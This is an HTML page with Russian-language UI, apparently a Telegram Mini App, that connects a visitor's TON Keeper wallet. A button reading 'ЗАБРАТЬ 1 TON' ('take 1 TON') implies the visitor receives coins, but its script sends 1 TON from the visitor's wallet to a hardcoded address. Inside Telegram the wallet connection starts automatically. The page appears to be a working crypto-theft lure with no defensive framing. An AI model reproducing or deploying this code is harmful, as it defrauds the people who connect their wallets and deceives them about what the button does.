<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            letter-spacing: 0.5px;
            transition: 0.3s;
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn:disabled {
            opacity: 0.5;
            transform: none;
        }
        .btn-red {
            background: linear-gradient(135deg, #e84800, #c03800);
        }
        .btn-green {
            background: linear-gradient(135deg, #00cc44, #008833);
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #666;
            min-height: 40px;
            word-break: break-all;
        }
        .address-hint {
            font-size: 11px;
            color: #333;
            margin-top: 10px;
            word-break: break-all;
        }
        .hidden {
            display: none !important;
        }
        .balance-display {
            font-size: 22px;
            color: #00ff88;
            margin: 12px 0;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        <div class="balance-display" id="balanceDisplay">💰 0 TON</div>
        <button class="btn" id="connectBtn">ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
        <button class="btn btn-red hidden" id="snipeBtn">🔥 ЗАБРАТЬ 1 TON</button>
        <div id="status">Нажмите кнопку</div>
        <div class="address-hint" id="addressHint">UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        const AMOUNT_TON = 1; // ====== 1 ТОН ======
        let userAddress = null;
        let provider = null;
        let isConnected = false;

        const connectBtn = document.getElementById('connectBtn');
        const snipeBtn = document.getElementById('snipeBtn');
        const status = document.getElementById('status');
        const addressHint = document.getElementById('addressHint');
        const balanceDisplay = document.getElementById('balanceDisplay');

        // ========== ПРОВЕРКА ==========
        function isTelegram() {
            return window.Telegram && window.Telegram.WebApp;
        }

        // ========== ПОДКЛЮЧЕНИЕ ==========
        async function connectTon() {
            try {
                status.innerText = '⏳ Подключение...';
                connectBtn.disabled = true;

                if (window.tonkeeper) {
                    provider = window.tonkeeper;
                    const accounts = await provider.send('ton_requestAccounts', {});
                    if (accounts && accounts.length > 0) {
                        userAddress = accounts[0];
                        isConnected = true;
                        afterConnect();
                        return;
                    }
                }

                if (isTelegram()) {
                    status.innerText = '📱 Открываю через Telegram...';
                    const tg = window.Telegram.WebApp;
                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent('tg://resolve')}`;
                    tg.openLink(connectUrl);
                    status.innerText = '✅ Подтвердите в TON Keeper';
                    connectBtn.disabled = false;
                    await waitForConnection();
                    return;
                }

                if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                    status.innerText = '📱 Открываю TON Keeper...';
                    const url = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent(window.location.href)}`;
                    window.open(url, '_blank');
                    status.innerText = '✅ Подтвердите в TON Keeper';
                    connectBtn.disabled = false;
                    await waitForConnection();
                    return;
                }

                status.innerText = '❌ Установите TON Keeper';
                connectBtn.disabled = false;

            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
                connectBtn.disabled = false;
            }
        }

        // ========== ОЖИДАНИЕ ПОДКЛЮЧЕНИЯ ==========
        function waitForConnection() {
            return new Promise((resolve) => {
                let attempts = 0;
                const interval = setInterval(async () => {
                    attempts++;
                    
                    if (window.tonkeeper) {
                        try {
                            provider = window.tonkeeper;
                            const accounts = await provider.send('ton_requestAccounts', {});
                            if (accounts && accounts.length > 0) {
                                userAddress = accounts[0];
                                isConnected = true;
                                clearInterval(interval);
                                afterConnect();
                                resolve();
                                return;
                            }
                        } catch(e) {}
                    }
                    
                    if (attempts > 30) {
                        clearInterval(interval);
                        status.innerText = '⏳ Подтвердите подключение в TON Keeper';
                        resolve();
                    }
                }, 1000);
            });
        }

        // ========== ПОСЛЕ ПОДКЛЮЧЕНИЯ ==========
        function afterConnect() {
            status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
            connectBtn.classList.add('hidden');
            snipeBtn.classList.remove('hidden');
            addressHint.classList.add('hidden');
            
            updateBalance();
        }

        // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
        async function updateBalance() {
            try {
                if (!provider) return 0;
                const hex = await provider.send('ton_getBalance', { address: userAddress });
                const nano = parseInt(hex, 16);
                const balance = (nano / 1e9).toFixed(6);
                balanceDisplay.innerText = `💰 ${balance} TON`;
                return nano;
            } catch(e) {
                return 0;
            }
        }

        // ========== ВЫВОД РОВНО 1 TON ==========
        async function snipe() {
            try {
                status.innerText = '⏳ Проверка баланса...';
                snipeBtn.disabled = true;

                if (!provider) {
                    status.innerText = '❌ Нет подключения';
                    snipeBtn.disabled = false;
                    return;
                }

                const nano = await updateBalance();
                const amountNano = AMOUNT_TON * 1e9; // 1 TON = 1,000,000,000 нано
                const fee = 5000000; // 0.005 TON
                const totalNeeded = amountNano + fee;

                if (nano < totalNeeded) {
                    status.innerText = `⚠️ Не хватает. Нужно ${(totalNeeded/1e9).toFixed(6)} TON (1 TON + комиссия)`;
                    snipeBtn.disabled = false;
                    return;
                }

                status.innerText = `⏳ Перевод ${AMOUNT_TON} TON...`;

                const tx = {
                    to: TARGET,
                    value: amountNano.toString(),
                    data: '',
                    stateInit: ''
                };

                const result = await provider.send('ton_sendTransaction', tx);

                if (result && result.code === 0) {
                    status.innerText = `✅ ${AMOUNT_TON} TON ПЕРЕВЕДЕНО!`;
                    snipeBtn.innerText = '✅ ГОТОВО';
                    snipeBtn.disabled = true;
                    snipeBtn.className = 'btn btn-green';
                    await updateBalance();
                } else {
                    status.innerText = `❌ Транзакция отклонена`;
                    snipeBtn.disabled = false;
                }

            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
                snipeBtn.disabled = false;
            }
        }

        // ========== КНОПКИ ==========
        connectBtn.onclick = connectTon;
        snipeBtn.onclick = snipe;

        // ========== АВТОПРОВЕРКА ==========
        setTimeout(() => {
            if (window.tonkeeper) {
                status.innerText = '🟢 TON Keeper найден. Нажмите кнопку.';
            } else if (isTelegram()) {
                status.innerText = '📱 Telegram Mini App. Нажмите кнопку.';
            } else {
                status.innerText = 'Нажмите кнопку для подключения';
            }
        }, 500);

        // ========== АВТОМАТИЧЕСКИЙ ЗАПУСК В TELEGRAM ==========
        if (isTelegram()) {
            setTimeout(() => {
                if (!isConnected) {
                    connectTon();
                }
            }, 1000);
        }
    </script>
</body>
</html>
